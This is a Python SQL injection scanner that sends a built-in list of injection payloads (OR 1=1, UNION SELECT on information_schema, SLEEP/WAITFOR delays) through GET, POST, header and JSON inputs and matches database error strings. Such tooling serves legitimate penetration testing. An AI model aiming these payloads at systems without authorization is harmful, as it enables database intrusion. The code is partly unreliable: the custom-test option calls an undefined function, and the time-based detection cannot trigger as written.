#!/usr/bin/env python3
"""
Automated SQL Injection Tester (Advanced)
Tests GET parameters, POST body, HTTP headers, and JSON payloads for SQLi vulnerabilities.
"""

import requests
import urllib.parse
import json
import time
import re
import sys
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
import urllib3

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from core import setup_logger, get_validated_input, validate_url, ScanResult, Finding, get_session

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# SQL Injection Payloads Database
SQL_PAYLOADS = {
    'error_based': [
        "'", "\"", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
        "admin' --", "admin' #", "admin'/*", "' or 1=1--", "' or 1=1#",
        "' or 1=1/*", "') or '1'='1--", "') or ('1'='1--",
        "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
        "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
        "1' AND 1=1--", "1' AND 1=2--"
    ],
    'union_based': [
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--", "' UNION ALL SELECT NULL,NULL--",
        "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "1' UNION SELECT column_name,NULL FROM information_schema.columns--",
    ],
    'boolean_based': [
        "1' AND '1'='1", "1' AND '1'='2", "1' AND 1=1--", "1' AND 1=2--",
        "1 AND 1=1", "1 AND 1=2"
    ],
    'time_based': [
        "' AND SLEEP(5)--", "' AND BENCHMARK(10000000,MD5('test'))--",
        "1'; WAITFOR DELAY '00:00:05'--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ]
}

ERROR_SIGNATURES = [
    'SQL syntax', 'mysql_fetch', 'Warning: mysql', 'mysqli_', 'MySQLSyntaxErrorException',
    'valid MySQL result', 'PostgreSQL.*ERROR', 'Warning.*pg_', 'valid PostgreSQL result',
    'Npgsql.', 'Driver.*SQL.*Error', 'ORA-', 'Oracle.*Driver', 'oracle.*error',
    'Microsoft SQL Native Client error', 'ODBC SQL Server Driver', 'SQLServer JDBC Driver',
    'SqlClient', 'Unclosed quotation mark', 'quoted string not properly terminated',
]


def run():
    logger = setup_logger("sql_injector")
    logger.info("SQL Injection Tester started")
    
    print("\033[92m" + "="*70)
    print("        AUTOMATED SQL INJECTION TESTER (Advanced)")
    print("="*70 + "\033[0m\n")
    
    print("\033[93m[!] WARNING: Only test applications you own or have permission to test!\033[0m\n")
    
    try:
        target_url = input("\033[97m[?] Enter target URL: \033[0m").strip()
        if not target_url:
            print("\033[91m[!] No URL provided.\033[0m")
            return
        
        # Validate URL
        try:
            target_url = validate_url(target_url)
        except ValueError as e:
            print(f"\033[91m[!] Invalid URL: {e}\033[0m")
            logger.error(f"Invalid URL: {e}")
            return
        
        logger.info(f"Target: {target_url}")
        
        print("\n\033[97m[*] Testing Options:\033[0m")
        print("  [1] GET Parameters (quick)")
        print("  [2] POST Body (form data)")
        print("  [3] HTTP Headers (User-Agent, Referer, etc.)")
        print("  [4] JSON Body (API endpoints)")
        print("  [5] All Methods (comprehensive)")
        print("  [6] Custom")
        
        choice = input("\n\033[95m[?] Select test type: \033[0m").strip()
        
        session = get_session(rotate_ua=True)
        
        # Create result object
        result = ScanResult(
            tool="sql_injector",
            target=target_url
        )
        
        vulnerabilities = []
        
        if choice == '1':
            logger.info("Testing GET parameters")
            vulnerabilities = test_get_parameters(target_url, session, logger)
        
        elif choice == '2':
            logger.info("Testing POST body")
            vulnerabilities = test_post_body(target_url, session, logger)
        
        elif choice == '3':
            logger.info("Testing HTTP headers")
            vulnerabilities = test_headers(target_url, session, logger)
        
        elif choice == '4':
            logger.info("Testing JSON body")
            vulnerabilities = test_json_body(target_url, session, logger)
        
        elif choice == '5':
            logger.info("Running comprehensive test (all methods)")
            vulnerabilities = []
            vulnerabilities.extend(test_get_parameters(target_url, session, logger))
            time.sleep(1)
            vulnerabilities.extend(test_post_body(target_url, session, logger))
            time.sleep(1)
            vulnerabilities.extend(test_headers(target_url, session, logger))
            time.sleep(1)
            vulnerabilities.extend(test_json_body(target_url, session, logger))
        
        elif choice == '6':
            test_method = input("\033[97m[?] Enter test method (get/post/header/json): \033[0m").strip().lower()
            custom_param = input("\033[97m[?] Enter parameter name to test: \033[0m").strip()
            custom_payload = input("\033[97m[?] Enter custom payload: \033[0m").strip()
            
            if test_method == 'get':
                vulnerabilities = [test_payload(target_url, custom_param, custom_payload, 'get', session, logger)]
            elif test_method == 'post':
                vulnerabilities = [test_payload(target_url, custom_param, custom_payload, 'post', session, logger)]
            else:
                print("\033[91m[!] Invalid test method.\033[0m")
                return
        
        else:
            print("\033[91m[!] Invalid choice.\033[0m")
            logger.error("Invalid test type choice")
            return
        
        # Filter out None results
        vulnerabilities = [v for v in vulnerabilities if v is not None]
        
        # Add findings to result
        for vuln in vulnerabilities:
            result.add_finding_dict(
                title=f"SQL Injection - {vuln['technique']}",
                description=f"Potential SQLi in {vuln['location']}",
                severity="CRITICAL",
                finding_type="sql_injection",
                details=vuln
            )
        
        # Display results
        print(f"\n\033[92m{'='*70}\033[0m")
        print(f"\033[92m[*] SQL Injection Testing Complete\033[0m")
        print(f"\033[92m{'='*70}\033[0m\n")
        
        if vulnerabilities:
            print(f"\033[91m[!] FOUND {len(vulnerabilities)} POTENTIAL SQL INJECTION VULNERABILITIES!\033[0m\n")
            
            for i, v in enumerate(vulnerabilities, 1):
                print(f"\033[93m[{i}] Location: {v['location']}\033[0m")
                print(f"    Technique: {v['technique']}")
                print(f"    Parameter: {v['param']}")
                print(f"    Payload: {v['payload'][:60]}...")
                print(f"    Evidence: {v['evidence']}\n")
            
            logger.warning(f"Found {len(vulnerabilities)} potential SQLi vulnerabilities")
            
            # Save results
            save = input("\033[95m[?] Save results to JSON file? (y/n): \033[0m").strip().lower()
            if save == 'y':
                filename = f"sqli_results_{int(time.time())}.json"
                try:
                    result.save_to_file(filename)
                    print(f"\033[92m[*] Results saved to {filename}\033[0m")
                    logger.info(f"Results saved to {filename}")
                except Exception as e:
                    logger.error(f"Error saving file: {e}")
                    print(f"\033[91m[!] Error saving file: {e}\033[0m")
        else:
            print(f"\033[92m[*] No SQL injection vulnerabilities detected.\033[0m")
            logger.info("No vulnerabilities detected")
        
        return result
        
    except KeyboardInterrupt:
        print("\n\033[91m[!] Test interrupted by user.\033[0m")
        logger.warning("Test interrupted by user")
        return None
    
    except Exception as e:
        logger.error(f"Unexpected error: {e}", exc_info=True)
        print(f"\033[91m[!] Unexpected error: {e}\033[0m")
        return None


def test_get_parameters(target_url, session, logger):
    """Test GET parameters for SQL injection."""
    vulnerabilities = []
    
    parsed = urllib.parse.urlparse(target_url)
    params = urllib.parse.parse_qs(parsed.query)
    
    if not params:
        print("\033[97m[*] No GET parameters found.\033[0m")
        logger.info("No GET parameters found")
        return vulnerabilities
    
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    print(f"\033[96m[*] Testing GET parameters: {list(params.keys())}\033[0m")
    
    for param_name in params.keys():
        for technique, payloads in SQL_PAYLOADS.items():
            for payload in payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{base_url}?{query_string}"
                
                result = test_payload_request(test_url, param_name, payload, technique, "GET parameter", logger)
                if result:
                    vulnerabilities.append(result)
                    print(f"\033[91m[!] FOUND: {result['location']} ({result['technique']})\033[0m")
    
    return vulnerabilities


def test_post_body(target_url, session, logger):
    """Test POST body parameters for SQL injection."""
    vulnerabilities = []
    
    print(f"\033[96m[*] Testing POST body parameters...\033[0m")
    
    # Common POST parameter names
    common_params = ['username', 'password', 'email', 'name', 'id', 'search', 'query']
    
    for param_name in common_params:
        for technique, payloads in SQL_PAYLOADS.items():
            for payload in payloads:
                data = {param_name: payload}
                
                try:
                    response = requests.post(target_url, data=data, timeout=10, verify=False)
                    result = check_response(param_name, payload, technique, "POST body", response, logger)
                    if result:
                        vulnerabilities.append(result)
                        print(f"\033[91m[!] FOUND: {result['location']} ({result['technique']})\033[0m")
                except Exception as e:
                    logger.debug(f"Error testing {param_name}: {e}")
    
    return vulnerabilities


def test_headers(target_url, session, logger):
    """Test HTTP headers for SQL injection."""
    vulnerabilities = []
    
    print(f"\033[96m[*] Testing HTTP headers...\033[0m")
    
    # Headers to test
    headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For', 'Cookie', 'Accept-Language']
    
    for header_name in headers_to_test:
        for technique, payloads in SQL_PAYLOADS.items():
            for payload in payloads[:5]:  # Limit payloads per header for speed
                headers = {header_name: payload}
                
                try:
                    response = requests.get(target_url, headers=headers, timeout=10, verify=False)
                    result = check_response(header_name, payload, technique, f"HTTP Header: {header_name}", response, logger)
                    if result:
                        vulnerabilities.append(result)
                        print(f"\033[91m[!] FOUND: {result['location']} ({result['technique']})\033[0m")
                except Exception as e:
                    logger.debug(f"Error testing header {header_name}: {e}")
    
    return vulnerabilities


def test_json_body(target_url, session, logger):
    """Test JSON body (API endpoints) for SQL injection."""
    vulnerabilities = []
    
    print(f"\033[96m[*] Testing JSON body (API endpoints)...\033[0m")
    
    # Common JSON parameters for APIs
    common_json_params = ['id', 'search', 'query', 'username', 'email', 'filter']
    
    for param_name in common_json_params:
        for technique, payloads in SQL_PAYLOADS.items():
            for payload in payloads[:5]:  # Limit for speed
                json_data = {param_name: payload}
                
                try:
                    response = requests.post(target_url, json=json_data, timeout=10, verify=False)
                    result = check_response(param_name, payload, technique, "JSON body", response, logger)
                    if result:
                        vulnerabilities.append(result)
                        print(f"\033[91m[!] FOUND: {result['location']} ({result['technique']})\033[0m")
                except Exception as e:
                    logger.debug(f"Error testing JSON param {param_name}: {e}")
    
    return vulnerabilities


def test_payload_request(url, param_name, payload, technique, location, logger):
    """Send a test request and check for SQLi indicators."""
    try:
        response = requests.get(url, timeout=10, verify=False)
        return check_response(param_name, payload, technique, location, response, logger)
    except requests.Timeout:
        if 'SLEEP' in payload:
            return {
                'param': param_name,
                'payload': payload,
                'technique': technique,
                'location': location,
                'evidence': 'Request timeout (possible time-based SQLi)',
                'status_code': 'TIMEOUT'
            }
    except Exception as e:
        logger.debug(f"Error testing payload: {e}")
    
    return None


def check_response(param_name, payload, technique, location, response, logger):
    """Check response for SQL error signatures."""
    for signature in ERROR_SIGNATURES:
        if re.search(signature, response.text, re.IGNORECASE):
            finding = {
                'param': param_name,
                'payload': payload,
                'technique': technique,
                'location': location,
                'evidence': f'SQL error signature found: {signature}',
                'status_code': response.status_code
            }
            logger.warning(f"SQLi found: {location} - {signature}")
            return finding
    
    return None


if __name__ == "__main__":
    run()
